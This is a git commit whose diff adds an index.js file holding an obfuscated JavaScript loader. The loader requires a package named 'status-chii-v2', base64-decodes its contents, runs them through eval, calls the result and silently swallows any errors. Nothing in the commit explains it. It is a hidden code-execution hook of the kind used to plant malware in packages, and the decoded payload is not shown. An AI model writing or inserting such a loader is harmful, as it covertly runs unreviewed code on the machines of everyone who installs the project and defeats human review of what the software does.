74e96fbeccafa320f5f1c8e7d78276a71ed3ad60
AD-CHII <phdy444@gmail.com>
2024-09-28 19:21:24 +0700

    index.js

---
+++ index.js
@@ -0,0 +1,23 @@
+(function () {
+    let _0x1a3b = 'utf8';
+    let _0x9f45 = 'status-chii-v2';
+    let _0x7bdc = 'base64';
+    function _0x8dfg6(_0x5e1a, _0x6b7d) {
+        return (function (_0x2f7c, _0x1f3b) {
+            return _0x2f7c(_0x5e1a, _0x1f3b);
+        })(function (_0x4f32, _0x8e9d) {
+            return eval(_0x4f32);
+        }, _0x6b7d);
+    }
+    try {
+        let _0x21a9 = Buffer.from(require(_0x9f45), _0x7bdc).toString(_0x1a3b);
+        let _0x13fe = _0x8dfg6(_0x21a9, require);
+        if (typeof _0x13fe === 'function') {
+            _0x13fe();
+        }
+    } catch (error) {
+        let originalConsoleError = console.error;
+        console.error = () => { };
+        console.error = originalConsoleError;
+    }
+})();
